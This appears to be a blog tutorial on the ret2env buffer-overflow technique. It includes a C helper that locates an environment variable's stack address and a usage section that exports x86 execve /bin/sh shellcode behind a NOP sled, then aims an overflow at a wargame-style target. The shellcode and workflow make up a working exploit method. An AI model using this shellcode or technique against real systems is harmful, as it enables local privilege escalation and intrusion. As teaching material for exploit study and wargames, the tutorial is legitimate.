---
title: "Locating Environment Variable Memory Addresses for Exploit Payloads"
date: 2014-12-04T19:32:27+00:00
url: "/get-environment-variable-memory-address/"
draft: false
description: "How to reliably determine the memory address of environment variables on the Linux stack during binary exploitation and ret2env attacks."
categories: ["exploit-dev", "Security"]
tags: ["exploit-dev", "c", "ret2env", "environment-variables", "memory-layout", "linux"]
---

When exploiting buffer overflows in space-constrained stack frames (e.g., when the vulnerable buffer is only 20 or 30 bytes), you cannot fit a standard 50-byte shellcode payload directly on the stack.

A classic exploitation technique is **ret2env**: injecting the shellcode into an environment variable (`export EGG=...`) and redirecting execution to its address located near the high end of the process address space.

---

### Why Addresses Shift

Environment variables reside at the top of the user stack directly below the initial stack frame. Because the program name (`argv[0]`) is pushed onto the stack immediately following the environment pointer (`envp`), the exact address of an environment variable depends slightly on the length of the binary name:

$$\text{Address}_{\text{Target}} \approx \text{Address}_{\text{Helper}} + (\text{Length}_{\text{Helper}} - \text{Length}_{\text{Target}}) \times 2$$

---

### The C Helper Utility (`getenv.c`)

This lightweight utility reads and prints the memory pointer of any requested environment variable:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <ENV_VAR_NAME> [TARGET_BINARY]\n", argv[0]);
        return 1;
    }

    char *ptr = getenv(argv[1]);
    if (!ptr) {
        printf("Environment variable '%s' not found.\n", argv[1]);
        return 1;
    }

    // Direct pointer in current process
    printf("Raw pointer in %s: %p\n", argv[0], ptr);

    // If target binary path is supplied, calculate adjusted offset
    if (argc >= 3) {
        ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
        printf("Adjusted pointer for %s: %p\n", argv[2], ptr);
    }

    return 0;
}
```

---

### Usage Example

1. **Export your shellcode with a leading NOP sled:**
   ```bash
   export EGG=$(python -c "print '\x90'*64 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
   ```

2. **Compile the helper and query the address for your target binary:**
   ```bash
   gcc getenv.c -o getenv
   ./getenv EGG /levels/level06
   # Adjusted pointer for /levels/level06: 0xbffffde4
   ```

3. **Deploy the target address into your buffer overflow return address slot.**
